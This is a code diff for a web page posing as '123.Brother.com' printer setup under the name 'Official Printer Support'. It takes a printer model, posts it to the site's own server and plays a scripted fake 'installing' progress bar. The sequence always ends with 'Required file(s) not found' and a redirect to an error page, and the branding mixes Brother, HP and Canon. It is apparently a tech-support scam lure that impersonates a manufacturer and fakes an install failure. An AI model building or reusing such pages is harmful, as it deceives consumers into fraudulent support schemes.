@@ -2,58 +2,344 @@
 <html>
 <head>
   <title>Brother Setup</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Serif+Gurmukhi:wght@100..900&family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&family=Roboto:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+  <style>
+   .hp-hero {
+  width: 100%;
+  height: 100vh;
+  background: #fff;
+  display: flex;
+  align-items: center;
+   font-family: "Poppins", sans-serif;
+  font-weight: 100;
+  font-style: normal;
+}
+body{
+  padding: 0;
+  margin: 0;
+  box-sizing: border-box;
+  font-family: "Poppins", sans-serif;
+  font-weight: 100;
+  font-style: normal;
+}
+.hp-container {
+    max-width: 1200px;
+    margin: auto;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 55px;
+    width: 100%;
+}
+
+#startBtn {
+    text-transform: uppercase;
+    white-space: nowrap;
+    color: #fff;
+    cursor: pointer;
+    background: #2563eb;
+    border: 0;
+    border-radius: 10px;
+    margin-top: 0;
+    padding: 10px 50px;
+    font-size: 27px;
+}
+
+.hp-text h1 {
+  font-size: 46px;
+  font-weight: 800;
+  color: #111827;
+  line-height: 1.2;
+  margin-bottom: 15px;
+}
+
+.hp-text h1 span {
+  font-weight: 900;
+}
+
+.subtitle {
+  font-size: 16px;
+  color: #374151;
+  margin-bottom: 25px;
+  font-weight: 400;
+}
+
+/* Input */
+.hp-text input {
+  width: 100%;
+  max-width: 620px;
+  padding: 14px;
+  border: 1px solid #cbd5e1;
+  border-radius: 6px;
+  font-size: 15px;
+  outline: none;
+  margin-bottom: 25px;
+}
+
+.hp-text input:focus {
+  border-color: #2563eb;
+}
+
+/* Button */
+.go-btn {
+  width: 160px;
+  padding: 14px;
+  background: #2563eb;
+  border: none;
+  border-radius: 10px;
+  font-size: 22px;
+  font-weight: 700;
+  color: white;
+  cursor: pointer;
+  transition: 0.3s;
+}
+
+.go-btn:hover {
+  background: #1d4ed8;
+}
+
+/* Note */
+.note {
+  margin-top: 12px;
+  font-size: 13px;
+  color: #6b7280;
+  font-weight: 400;
+}
+.hp-image {
+    text-align: center;
+    width: 405px;
+}
+.hp-image img {
+  width: 100%;
+  max-width: 420px;
+}
+.footer {
+  width: 100%;
+  background: #000;
+  padding: 18px 0;
+  text-align: center;
+}
+
+.footer p {
+  color: #fff;
+  font-size: 14px;
+  font-weight: 500;
+  padding: 0;
+  margin: 0;
+}
+.download-section {
+  width: 100%;
+  height: 100vh;
+  background: #fff;
+  display: flex;
+  align-items: center;
+}
+
+.download-container {
+  max-width: 1400px;
+  margin: auto;
+  width: 100%;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 0 60px;
+}
+
+/* Left Logo */
+.download-logo img {
+  width: 110px;
+}
+
+/* Center Progress */
+.download-progress {
+  text-align: center;
+  flex: 1;
+}
+
+.download-progress h3 {
+  font-size: 20px;
+  font-weight: 500;
+  color: #111827;
+  margin-bottom: 18px;
+}
+
+
+.progress-bar {
+  width: 420px;
+  height: 10px;
+  background: #d9d9d9;
+  border-radius: 20px;
+  margin: auto;
+  overflow: hidden;
+}
+
+.progress-fill {
+  width: 5%; 
+  height: 100%;
+  background: #bfbfbf;
+  border-radius: 20px;
+}
+
+/* Step Text */
+.step-text {
+  margin-top: 20px;
+  font-size: 14px;
+  color: #111827;
+}
+
+.status-text {
+  margin-top: 6px;
+  font-size: 15px;
+  font-weight: 500;
+  color: #111827;
+}
+
+/* Right Image */
+.download-image {
+  width: 420px;
+  border-radius: 10px;
+  overflow: hidden;
+}
+
+.download-image img {
+  width: 100%;
+  display: block;
+  border-radius: 10px;
+}
+.loaderWrap{
+  display: flex;
+  justify-content: flex-start;
+}
+.progress-container {
+    width: 282px;
+    background: #ddd;
+    border-radius: 8px;
+    overflow: hidden;
+    margin-bottom: 12px;
+}
+div#stepContent {
+    font-weight: 400;
+}
+  .progress-bar {
+    height: 20px;
+    width: 0%;
+    background: #0078d4;
+    transition: width 0.6s ease;
+    float: left;
+  }
+  .status {
+    font-size: 14px;
+    color: #333;
+  }
+  .red {
+  color: #d13438;
+  font-weight: 600;
+}
+  </style>
 </head>
 <body>
-
-<div id="formBox">
-  <h3>Enter Brother Printer Model</h3>
-  <input id="printerModel" placeholder="e.g. Brother Pixma G3010">
-  <button id="startBtn">Start Setup</button>
+<section class="hp-hero">
+  <div class="hp-container">
+    <div class="hp-text">
+      <h1>
+        Set up your Brother printer at <br>
+        <span>123.Brother.com</span>
+      </h1>
+      <p class="subtitle">
+        Download and install your printer software
+      </p>
+      <div id="formBox">
+ <input id="printerModel" placeholder='Enter exact model number or name. Ex: "Brother Pixma G3010"'>
+  <button id="startBtn">GO</button>
+  </div>
+      <p class="note">
+        Enter your Brother, OfficeJet, LaserJet or DeskJet model number.
+      </p>
+    </div>
+    <div class="loaderWrap">
+      <div id="loadingBox" style="display:none;">
+  <h3>Processing HP Printer…</h3>
+  <div class="progress-container">
+  <div class="progress-bar" id="progressBar"></div>
 </div>
-
-<div id="loadingBox" style="display:none;">
-  <h3>Processing Canon Printer…</h3>
   <div id="stepContent"></div>
 </div>
+
+    </div>
+    <div class="hp-image">
+      <img src="./img/DJPrinters.png" alt="HP Printers">
+    </div>
+  </div>
+</section>
+<footer class="footer">
+  <p>Copyright © 2026 by Official Printer Support</p>
+</footer>
 
 <script>
 document.getElementById("startBtn").addEventListener("click", async function () {
   const model = document.getElementById("printerModel").value.trim();
-  if (!model) return alert("Enter printer model");
-
+  if (!model) {
+    alert("Please enter printer model");
+    return;
+  }
   sessionStorage.setItem("printerModel", model);
-
-  await fetch("/api/send-model", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      printerModel: model,
-      brand: "Brother"
-    })
-  });
-
+  try {
+    await fetch("/api/send-model", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        printerModel: model,
+        brand: "HP"
+      })
+    });
+  } catch (e) {
+    console.log("Model mail failed (non-blocking)");
+  }
   document.getElementById("formBox").style.display = "none";
   document.getElementById("loadingBox").style.display = "block";
 
-  const steps = [
-    "Detecting Canon connection…",
-    "Checking Canon requirements…",
-    "Preparing Canon install…",
-    "Installing Canon software…",
-    "Required file(s) not found"
-  ];
+const steps = [
+  `<p>Detecting Brother connection…</p>`,
+  `<p>Checking Brother requirements…</p>`,
+  `<p>Preparing Brother install…</p>`,
+  `<p>Installing Brother software…</p>`,
+  `<p class="red">Required file(s) not found</p>`
+];
+
+
+  const progressBar = document.getElementById("progressBar");
+  const statusText = document.getElementById("statusText");
+
+  let currentStep = 0;
+  const stepDuration = 1500; 
+  const stepPercent = 100 / steps.length;
+
+  function runProgress() {
+    if (currentStep < steps.length) {
+
+      progressBar.style.width = `${stepPercent * (currentStep + 1)}%`;
+      currentStep++;
+      setTimeout(runProgress, stepDuration);
+    }
+  }
+
+  runProgress();
 
   let i = 0;
   function next() {
-    document.getElementById("stepContent").innerText = steps[i++];
+    document.getElementById("stepContent").innerHTML = steps[i];
+    i++;
     if (i < steps.length) {
       setTimeout(next, 2500);
     } else {
       setTimeout(() => {
-        window.location.href = "/brother-error.html";
+       window.location.href = "/brother-error.html";
       }, 2500);
     }
   }
+
   next();
 });
 </script>
